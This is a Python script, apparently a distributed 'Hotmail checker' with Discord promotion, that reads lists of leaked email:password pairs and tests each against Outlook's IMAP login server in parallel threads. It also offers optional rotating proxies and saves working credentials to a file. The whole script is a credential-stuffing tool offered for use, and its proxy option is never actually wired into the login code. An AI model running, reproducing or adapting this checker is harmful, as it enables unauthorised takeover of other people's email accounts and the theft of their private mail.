import importlib
import subprocess
from concurrent.futures import ThreadPoolExecutor
import random
import imaplib
from termcolor import colored

# Names of required modules
required_modules = ['termcolor', 'concurrent.futures', 'requests', 'PySocks', 'socks']

def check_and_install_module(module_name):
    try:
        importlib.import_module(module_name)
        print(f"{module_name} module is already installed.")
    except ImportError:
        print(f"{module_name} module not found, installing...")
        subprocess.check_call(['pip', 'install', module_name])
        print(f"{module_name} module successfully installed.")

def print_banner():
    print(colored("""
┏┓╋┏┓╋╋┏┓╋╋╋╋╋╋╋┏┓╋┏━━━┳┓╋╋╋╋╋╋╋┏┓
┃┃╋┃┃╋┏┛┗┓╋╋╋╋╋╋┃┃╋┃┏━┓┃┃╋╋╋╋╋╋╋┃┃
┃┗━┛┣━┻┓┏╋┓┏┳━━┳┫┃╋┃┃╋┗┫┗━┳━━┳━━┫┃┏┳━━┳━┓
┃┏━┓┃┏┓┃┃┃┗┛┃┏┓┣┫┃╋┃┃╋┏┫┏┓┃┃━┫┏━┫┗┛┫┃━┫┏┛
┃┃╋┃┃┗┛┃┗┫┃┃┃┏┓┃┃┗┓┃┗━┛┃┃┃┃┃━┫┗━┫┏┓┫┃━┫┃
┗┛╋┗┻━━┻━┻┻┻┻┛┗┻┻━┛┗━━━┻┛┗┻━━┻━━┻┛┗┻━━┻┛
    """, 'cyan'))
    print(colored("discord.gg/versaquality\n instagram - discord: xmed4sa\n instagram: @veraildez , discord: @veraildez77", 'cyan'))

def check_hotmail_account(email_address, password, proxy=None):
    try:
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        mail = imaplib.IMAP4_SSL('imap-mail.outlook.com')
        mail.login(email_address, password)
        mail.select('inbox')
        status, messages = mail.search(None, 'ALL')
        mail.logout()
        if status == "OK":
            return True
        else:
            return False
    except imaplib.IMAP4.error:
        return False
    except Exception as e:
        print(colored(f"An error occurred: {e}", 'red'))
        return False

def process_account(account, proxies=None):
    email_address, password = account.strip().split(':')
    proxy = random.choice(proxies) if proxies else None
    if check_hotmail_account(email_address, password, proxy):
        print(colored(f"Account {email_address} is valid. | Checker By = discord.gg/versaquality - @xmed4sa @veraildez77", 'green'))
        with open('successful.txt', 'a') as f:
            f.write(f"{email_address}:{password} | Checker By = discord.gg/versaquality - @xmed4sa @veraildez77\n")
        return True
    else:
        print(colored(f"Account {email_address} is invalid or login failed. | Checker By = discord.gg/versaquality - @xmed4sa @veraildez77", 'red'))
        return False

def check_accounts(file_path, proxies=None, max_workers=None):
    with open(file_path, 'r') as file:
        accounts = file.readlines()

    if not max_workers:
        max_workers = int(input("Enter number of threads (recommended 1-10 if not using proxies): "))
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        results = list(executor.map(lambda acc: process_account(acc, proxies), accounts))

    if any(results):
        print(colored("Valid accounts saved to successful.txt.", 'blue'))
    else:
        print(colored("No valid accounts found.", 'yellow'))

def main():
    for module in required_modules:
        check_and_install_module(module)

    print("Required modules installed successfully or already installed.")
    print_banner()
    
    while True:
        password = input("Please enter the password (versaquality): ")
        if password == 'versaquality':
            break
        else:
            print(colored("Incorrect password, please try again.", 'red'))

    proxy_choice = input("Do you want to use proxies? (yes/no): ").strip().lower()
    
    proxies = None
    if proxy_choice == 'yes':
        proxy_file_path = input("Please enter the file path containing HTTP proxies: ")
        with open(proxy_file_path, 'r') as proxy_file:
            proxies = [proxy.strip() for proxy in proxy_file.readlines()]
        print(colored("Proxy list loaded, using random proxies.", 'blue'))
    
    file_path = input("Please enter the file path containing accounts: ")
    check_accounts(file_path, proxies)

if __name__ == "__main__":
    main()
